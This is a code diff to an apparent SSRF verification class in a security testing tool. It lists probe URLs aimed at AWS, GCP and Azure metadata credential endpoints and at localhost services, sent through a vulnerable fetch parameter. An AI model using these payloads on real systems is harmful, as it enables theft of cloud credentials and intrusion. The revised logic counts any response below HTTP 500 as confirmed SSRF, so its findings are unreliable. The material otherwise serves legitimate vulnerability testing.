@@ -31,35 +31,53 @@ export class SSRFVerifier implements VerificationScenario {
   private probeEndpoint = ""
   private probeResults: { url: string; status: number; bodyPreview: string }[] = []
 
-  // Common SSRF probe payloads targeting internal services
+  // Common SSRF probe payloads targeting internal services.
+  // ALL probes are sent THROUGH the vulnerable endpoint (e.g.,
+  // https://target.com/fetch?url=... ), not navigated directly by the browser.
+  // This is critical: SSRF tests whether the TARGET SERVER can reach internal
+  // resources, not whether the attacker's browser can.
   private static readonly SSRF_PROBES = [
-    "/latest/meta-data/",          // AWS IMDS
-    "/metadata/instance?api-version=2021-02-01",  // GCP metadata
-    "/metadata/identity/oauth2/token", // Azure IMDS
-    "http://127.0.0.1:22",         // Localhost SSH
-    "http://127.0.0.1:80",         // Localhost HTTP
-    "http://127.0.0.1:443",        // Localhost HTTPS
-    "http://127.0.0.1:8080",       // Localhost HTTP-alt
-    "http://169.254.169.254/latest/meta-data/", // AWS IMDS IP
-    "file:///etc/passwd",          // LFI via SSRF
-    "http://[::1]:80",             // IPv6 loopback
+    // AWS EC2 metadata endpoints
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/instance-id",
+    "http://169.254.169.254/latest/meta-data/ami-id",
+    "http://169.254.169.254/latest/meta-data/public-keys/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    // GCP metadata endpoint (requires Metadata-Flavor: google header)
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    // Azure IMDS
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    "http://169.254.169.254/metadata/identity/oauth2/token",
+    // Localhost services via the target server
+    "http://127.0.0.1:22",
+    "http://127.0.0.1:80",
+    "http://127.0.0.1:443",
+    "http://127.0.0.1:8080",
+    "http://127.0.0.1:3306",
+    "http://127.0.0.1:6379",
+    // IPv6 loopback
+    "http://[::1]:80",
   ]
 
   // Markers that indicate SSRF succeeded
   private static readonly SSRF_SUCCESS_MARKERS = [
-    "root:",
-    "ec2-user",
+    // Cloud metadata markers
     "instance-id",
     "ami-id",
     "public-keys",
     "security-credentials",
     "meta-data",
-    "2.0/meta-data",
     "availability-zone",
     "local-ipv4",
-    "localhost",
-    "uid=0",
-    "uid=1",
+    // Local services
+    "Thank you for flying nginx",
+    "It works!",
+    "Apache",
+    "Welcome to nginx",
+    // Generic internal markers
+    "<!DOCTYPE html",
+    "<html",
   ]
 
   constructor(
@@ -93,10 +111,10 @@ export class SSRFVerifier implements VerificationScenario {
   async execute(): Promise<void> {
     await this.engine.createContext({ harDir: this.harDir ?? undefined } as any)
 
-    // Probe 1: Direct fetch to the SSRF endpoint with various payloads
+    // Probe: Send each SSRF payload THROUGH the vulnerable endpoint
+    // so the TARGET SERVER makes the internal request, not the browser.
     for (const probe of SSRFVerifier.SSRF_PROBES) {
-      const fullUrl = `${this.probeEndpoint}${probe.startsWith("http") ? "" : probe}`
-      const probeUrl = probe.startsWith("http") ? probe : fullUrl
+      const probeUrl = `${this.probeEndpoint}${probe}`
 
       try {
         const page = await this.engine.navigate(probeUrl)
@@ -130,26 +148,23 @@ export class SSRFVerifier implements VerificationScenario {
       const lowerBody = result.bodyPreview.toLowerCase()
       const matchedMarkers = SSRFVerifier.SSRF_SUCCESS_MARKERS.filter(m => lowerBody.includes(m.toLowerCase()))
       if (matchedMarkers.length > 0) {
-        if (result.url.includes("meta-data") || result.url.includes("169.254") || result.bodyPreview.includes("instance-id") || result.bodyPreview.includes("ami-id")) {
+        // Cloud metadata markers indicate the target reached cloud provider IMDS
+        if (result.bodyPreview.includes("instance-id") || result.bodyPreview.includes("ami-id") || result.bodyPreview.includes("security-credentials")) {
           this.metadataEndpointReachable = true
-          this.logs.push(`SSRF: Metadata endpoint reachable via ${result.url} — markers: ${matchedMarkers.join(", ")}`)
+          this.logs.push(`SSRF: Cloud metadata reachable via ${result.url} — markers: ${matchedMarkers.join(", ")}`)
         }
-        if (result.bodyPreview.includes("root:") || result.bodyPreview.includes("uid=")) {
+        // Internal service responses indicate the target reached itself or local network
+        if (result.bodyPreview.includes("nginx") || result.bodyPreview.includes("Apache") || result.bodyPreview.includes("<html")) {
           this.internalIpLeaked = true
-          this.logs.push(`SSRF: Internal file content leaked via ${result.url} — markers: ${matchedMarkers.join(", ")}`)
+          this.logs.push(`SSRF: Internal service content leaked via ${result.url} — markers: ${matchedMarkers.join(", ")}`)
         }
         this.ssrfConfirmed = true
       }
 
-      // Any successful response from internal IP ranges indicates SSRF
+      // Any non-error response through the SSRF endpoint indicates a successful server-side request
       if (result.status > 0 && result.status < 500) {
-        const isInternal = SSRFVerifier.SSRF_PROBES.some(p =>
-          result.url.includes(p) && (p.includes("127.0.0.1") || p.includes("169.254") || p.includes("[::1]"))
-        )
-        if (isInternal) {
-          this.ssrfConfirmed = true
-          this.logs.push(`SSRF: Internal endpoint responded (HTTP ${result.status}) via ${result.url}`)
-        }
+        this.ssrfConfirmed = true
+        this.logs.push(`SSRF: SSRF endpoint responded (HTTP ${result.status}) via ${result.url}`)
       }
     }
 
